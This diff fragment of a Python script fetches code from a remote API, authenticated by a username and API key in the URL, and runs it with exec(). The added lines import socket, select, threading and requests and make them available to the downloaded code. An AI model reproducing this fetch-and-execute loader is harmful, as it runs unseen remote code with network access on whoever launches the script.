@@ -4,6 +4,16 @@ ChakeUrl=f"https://{URL}/api/getscript?username={username_}&api_key={api_key_}"
 Data = requests.get(ChakeUrl).json()
 success = Data.get("success")
 script = Data.get("script")
+from time          import sleep
+from threading     import Thread
+
+import re
+import socket
+import threading
+import select
+import requests
+global socket , threading ,select ,requests ,re ,Thread ,sleep
+
 exec(script)
 
 
